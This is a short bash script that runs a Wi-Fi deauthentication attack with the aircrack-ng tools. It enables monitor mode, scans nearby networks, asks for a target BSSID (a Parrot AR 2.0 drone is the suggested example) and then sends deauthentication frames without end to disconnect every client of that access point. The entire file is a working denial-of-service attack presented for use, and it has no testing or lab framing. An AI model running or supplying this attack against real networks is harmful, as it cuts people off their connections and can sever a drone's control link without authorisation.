#!/bin/bash

# Display the current wireless network configuration and settings
iwconfig

# Terminate processes that might interfere with setting a wireless interface to monitor mode
sudo airmon-ng check kill

# Enable monitor mode on wlan0 wireless interface for packet capturing on channel 6
sudo airmon-ng start wlan0 6

# List available wireless network interfaces and their current mode (Managed or Monitor)
sudo airmon-ng

# Display BSSID, ESSID, and other information about wireless networks and clients in range
echo "Starting airodump-ng to capture network information. Please identify the BSSID of your target network (e.g., Parrot AR 2.0 drone)..."
sudo airodump-ng wlan0mon &

# Wait a few seconds to allow airodump-ng to capture network data
sleep 10

# Ask the user to enter the BSSID of the target access point
echo "Enter the BSSID of the target access point (e.g., A0:14:3D:ED:92:14):"
read BSSID

# Stop the airodump-ng process
sudo killall airodump-ng

# Validate that a BSSID was entered
if [[ -z "$BSSID" ]]; then
    echo "No BSSID entered. Exiting."
    exit 1
fi

# Sending de-authentication frame to all clients connected to the target access point
echo "Sending de-authentication frames to disconnect clients from the access point with BSSID $BSSID..."
sudo aireplay-ng --deauth 0 -a $BSSID wlan0mon

echo "Attack completed."



